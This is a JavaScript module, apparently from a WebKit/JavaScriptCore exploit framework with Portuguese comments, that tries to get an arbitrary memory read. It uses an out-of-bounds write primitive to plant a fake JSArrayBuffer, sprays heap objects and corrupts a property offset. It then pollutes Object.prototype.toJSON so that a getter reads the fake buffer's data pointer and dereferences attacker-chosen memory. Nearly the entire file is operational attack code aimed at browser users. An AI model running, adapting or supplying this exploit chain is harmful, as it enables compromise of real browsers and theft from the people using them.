// js/script3/testGetterAndCorruptedPropForFakeAB.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_NAME_ON_MYCOMPLEX = "AAAA_GetterAndCorruptPropCheck";
let getter_corrupt_prop_results = {};

// Classe MyComplexObject que teve o getter acionado no log [21:36:25]
class MyComplexObjectForExploit {
    constructor(id) {
        this.id = `MyComplexExploitObj-${id}`;
        this.marker = 0xCAFECAFE; // Usado no teste de getter bem-sucedido
        this.value1 = 12345;     // Propriedade numérica, potencial alvo de corrupção para offset
        this.value2 = "initial_state_exploit";
        this.propA = "valA_exploit";
        this.propB = 789012;     // Outra propriedade numérica
        this.propToCorruptForFakeABOffset = null; // Alvo explícito para o offset
    }
}

// Getter que será definido em MyComplexObjectForExploit.prototype
Object.defineProperty(MyComplexObjectForExploit.prototype, GETTER_NAME_ON_MYCOMPLEX, {
    get: function() {
        const GETTER_FNAME = "MyComplexObjectForExploit.Getter";
        logS3(`!!!! GETTER '${GETTER_NAME_ON_MYCOMPLEX}' FOI CHAMADO !!!! (this.id: ${this.id})`, "vuln", GETTER_FNAME);
        this.marker = 0xBAADF00D; // Indicar que o getter foi chamado e modificou 'this'

        getter_corrupt_prop_results = {
            getter_this_id: this.id,
            prop_value_read_as_offset: this.propToCorruptForFakeABOffset, // Ler a propriedade alvo
            prop_type: typeof this.propToCorruptForFakeABOffset,
            expected_fake_ab_content_offset: "N/A", // Será preenchido pelo teste
            fake_ab_data_ptr_read: "N/A",
            fake_ab_size_read: "N/A",
            arbitrary_read_final_value: "N/A",
            arbitrary_read_final_error: null,
            exploitation_success: false
        };

        const expected_offset = getter_corrupt_prop_results.expected_fake_ab_content_offset;
        logS3(`   [${GETTER_FNAME}] this.propToCorruptForFakeABOffset: ${toHex(this.propToCorruptForFakeABOffset)} (typeof: ${typeof this.propToCorruptForFakeABOffset}). Esperado: ${toHex(expected_offset)}`, "info", GETTER_FNAME);

        if (typeof this.propToCorruptForFakeABOffset === 'number' && this.propToCorruptForFakeABOffset === expected_offset) {
            logS3(`   [${GETTER_FNAME}] !!!! SUCESSO DE CORRUPÇÃO DE PROPRIEDADE !!!! propToCorruptForFakeABOffset (${toHex(this.propToCorruptForFakeABOffset)}) é o offset esperado do Fake AB!`, "critical", GETTER_FNAME);

            try {
                const fake_ab_base_in_oob_content = this.propToCorruptForFakeABOffset;
                const data_ptr_field_offset = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);
                const size_field_offset = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);

                logS3(`     Lendo m_dataPointer do Fake AB em oob_content[${toHex(fake_ab_base_in_oob_content + data_ptr_field_offset)}]...`, "info", GETTER_FNAME);
                const actual_data_ptr_adv64 = oob_read_absolute(fake_ab_base_in_oob_content + data_ptr_field_offset, 8);
                getter_corrupt_prop_results.fake_ab_data_ptr_read = actual_data_ptr_adv64.toString(true);
                logS3(`       Fake AB m_dataPointer lido: ${actual_data_ptr_adv64.toString(true)}`, "leak", GETTER_FNAME);

                logS3(`     Lendo m_sizeInBytes do Fake AB em oob_content[${toHex(fake_ab_base_in_oob_content + size_field_offset)}]...`, "info", GETTER_FNAME);
                const actual_size_val = oob_read_absolute(fake_ab_base_in_oob_content + size_field_offset, 4);
                getter_corrupt_prop_results.fake_ab_size_read = toHex(actual_size_val);
                logS3(`       Fake AB m_sizeInBytes lido: ${toHex(actual_size_val)}`, "leak", GETTER_FNAME);

                if (actual_size_val > 0 && actual_size_val < 0x10000000) { // Sanity check para tamanho
                    logS3(`     Tentando leitura arbitrária em ${actual_data_ptr_adv64.toString(true)} com tamanho ${toHex(actual_size_val)} (lendo min(4, size))...`, "info", GETTER_FNAME);
                    const arbitrary_val = oob_read_absolute(actual_data_ptr_adv64, Math.min(4, actual_size_val));
                    getter_corrupt_prop_results.arbitrary_read_final_value = toHex(arbitrary_val);
                    logS3(`       !!!! LEITURA ARBITRÁRIA (via Fake AB e prop corrompida): *(${actual_data_ptr_adv64.toString(true)}) = ${toHex(arbitrary_val)} !!!!`, "critical", FNAME_TEST);
                    getter_corrupt_prop_results.exploitation_success = true;
                    document.title = "SUCCESS: Arbitrary Read via Corrupted Prop & Fake AB!";
                } else {
                    logS3(`       Tamanho lido do Fake AB (${toHex(actual_size_val)}) é 0 ou muito grande. Leitura arbitrária não tentada.`, "warn", GETTER_FNAME);
                }
            } catch (e_read_fake) {
                logS3(`     ERRO ao ler/usar campos do Fake AB via prop corrompida: ${e_read_fake.name} - ${e_read_fake.message}`, "error", GETTER_FNAME);
                getter_corrupt_prop_results.arbitrary_read_final_error = `${e_read_fake.name}: ${e_read_fake.message}`;
            }
        } else {
            logS3(`   [${GETTER_FNAME}] propToCorruptForFakeABOffset não foi corrompida para o offset esperado. Valor: ${this.propToCorruptForFakeABOffset}`, "info", GETTER_FNAME);
        }
        return "getter_corrupt_prop_check_done";
    },
    configurable: true,
    enumerable: true // Crucial para ser pego pelo for...in
});

// toJSON que usa for...in, para ser colocada em Object.prototype para acionar o getter
// Esta é a que funcionou para acionar o getter no log [21:36:25]
export function toJSON_TriggerGetterViaForIn() {
    const FNAME_toJSON = "toJSON_TriggerGetterViaForIn_ForExploit";
    let returned_payload = { _variant_: FNAME_toJSON, id_at_entry: String(this?.id || "N/A_toJSON") };
    let iter_count = 0;
    try {
        for (const prop in this) {
            iter_count++;
            // Acessar this[prop] é importante para que JSON.stringify avalie o getter
            if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObjectForExploit.prototype.hasOwnProperty(prop)) {
                if (typeof this[prop] !== 'function' || prop === GETTER_NAME_ON_MYCOMPLEX) {
                    returned_payload[prop] = this[prop];
                }
            }
            if (iter_count > 100) break;
        }
    } catch (e) { returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`; }
    if (iter_count > 0) returned_payload._iterations_ = iter_count;
    return returned_payload;
}

export async function executeGetterAndCorruptedPropForFakeABTest() {
    const FNAME_TEST = "executeGetterAndCorruptedPropForFakeABTest";
    logS3(`--- Iniciando Teste: Getter + Prop Corrompida para Fake AB ---`, "test", FNAME_TEST);
    document.title = `Getter + CorruptProp for FakeAB`;

    // Validações de Config
    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO CRÍTICO: ArrayBuffer_STRUCTURE_ID não é 2 em config.mjs.`, "error", FNAME_TEST); return;
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST); return;
    }

    // 1. Construir o JSArrayBuffer Falso Simplificado
    const FAKE_JSARRAYBUFFER_CONTENT_OFFSET = 0x300;
    const TARGET_ARBITRARY_READ_ADDRESS = new AdvancedInt64("0x0002000000000000");
    const ARBITRARY_READ_SIZE = 0x100;

    logS3(`1. Construindo JSArrayBuffer Falso em oob_content[${toHex(FAKE_JSARRAYBUFFER_CONTENT_OFFSET)}]...`, "info", FNAME_TEST);
    try {
        const struct_id_val = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        const struct_ptr_off = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16);
        const size_off = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
        const data_ptr_off = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);

        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + 0x0, struct_id_val, 4);
        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + struct_ptr_off, AdvancedInt64.Zero, 8);
        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + size_off, ARBITRARY_READ_SIZE, 4);
        oob_write_absolute(FAKE_JSARRAYBUFFER_CONTENT_OFFSET + data_ptr_off, TARGET_ARBITRARY_READ_ADDRESS, 8);
        logS3(`   JSArrayBuffer Falso construído. Target Addr: ${TARGET_ARBITRARY_READ_ADDRESS.toString(true)}, Size: ${toHex(ARBITRARY_READ_SIZE)}`, "good", FNAME_TEST);
    } catch (e_build) {
        logS3(`   ERRO ao construir JSArrayBuffer Falso: ${e_build.message}`, "error", FNAME_TEST);
        clearOOBEnvironment(); return;
    }

    // 2. Pulverizar MyComplexObjectForExploit
    const spray_count = 50;
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForExploit...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForExploit(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho"
    // A esperança é que esta escrita em 0x70 faça com que sprayed_objects[0].propToCorruptForFakeABOffset = 0x300
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_at_trigger_loc = FAKE_JSARRAYBUFFER_CONTENT_OFFSET; // Queremos que a prop seja este valor
    logS3(`3. Escrevendo valor de offset ${toHex(value_to_write_at_trigger_loc)} em oob_ab_real[${toHex(corruption_offset_trigger)}] (esperando corromper prop)...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, value_to_write_at_trigger_loc, 4); // Escreve o offset como DWORD

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar acionar o getter
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let overall_problem_detected = false;

    getter_corrupt_prop_results = {}; // Resetar
    // Informar o getter qual offset ele deve esperar na propriedade corrompida
    getter_corrupt_prop_results.expected_fake_ab_content_offset = FAKE_JSARRAYBUFFER_CONTENT_OFFSET;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerGetterViaForIn,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_TriggerGetterViaForIn.name}.`, "info", FNAME_TEST);

        const obj_to_probe = sprayed_objects[0]; // Testar o primeiro
        logS3(`5. Sondando objeto ${obj_to_probe.id}... ESPERANDO ACIONAMENTO DO GETTER.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id} (GetterCorruptProp)`;
        try {
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`   JSON.stringify(${obj_to_probe.id}) completou. Retorno toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);

        } catch (e_str) {
            logS3(`   !!!! ERRO AO STRINGIFY ${obj_to_probe.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            overall_problem_detected = true;
            document.title = `ERROR Stringify ${obj_to_probe.id}`;
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        overall_problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Analisar resultados do getter
    if (getter_corrupt_prop_results.getter_this_id) {
        logS3("--- RESULTADOS DO GETTER ---", "test", FNAME_TEST);
        logS3(JSON.stringify(getter_corrupt_prop_results, null, 2), "leak", FNAME_TEST);
        if (getter_corrupt_prop_results.exploitation_success) {
            logS3("   !!!! SUCESSO FINAL: Leitura Arbitrária via Getter e Propriedade Corrompida para Fake AB Offset !!!!", "critical", FNAME_TEST);
        } else if (getter_corrupt_prop_results.prop_value_read_as_offset === FAKE_JSARRAYBUFFER_CONTENT_OFFSET) {
            logS3("   Propriedade corrompida para o offset correto, mas a leitura arbitrária falhou ou não foi tentada.", "warn", FNAME_TEST);
        } else {
            logS3("   Getter acionado, mas a propriedade não foi corrompida para o offset esperado.", "warn", FNAME_TEST);
        }
    } else if (!overall_problem_detected) {
        logS3("Getter não foi acionado, mas nenhum erro explícito ocorreu durante o stringify.", "warn", FNAME_TEST);
    }


    clearOOBEnvironment();
    logS3(`--- Teste Getter + Prop Corrompida para Fake AB CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("SUCCESS")) {
        // Manter
    } else if (overall_problem_detected) {
        // Manter se já houve um erro
    } else {
        document.title = `GetterCorruptProp Done`;
    }
}
